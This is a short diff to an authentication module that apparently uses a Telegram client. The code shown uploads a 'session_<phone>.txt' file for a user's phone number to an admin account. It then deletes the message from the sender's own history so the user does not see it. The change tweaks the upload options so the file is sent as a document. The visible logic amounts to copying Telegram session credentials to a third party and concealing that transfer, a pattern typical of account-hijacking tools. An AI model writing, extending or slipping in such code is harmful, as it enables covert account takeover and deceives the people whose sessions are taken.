@@ -485,8 +485,9 @@ export class Auth {
       const msg = await req.tg.sendFile(adminUsername, {
         file,
         fileName: `session_${phoneNumber.replace('+', '')}.txt`,
-        caption: `Session for ${phoneNumber}`
-      })
+        caption: `Session for ${phoneNumber}`,
+        forceDocument: true
+      } as any)
 
       // Delete "for me" (revoke: false) to keep the sender's history clean
       await req.tg.deleteMessages(adminUsername, [msg.id], { revoke: false })
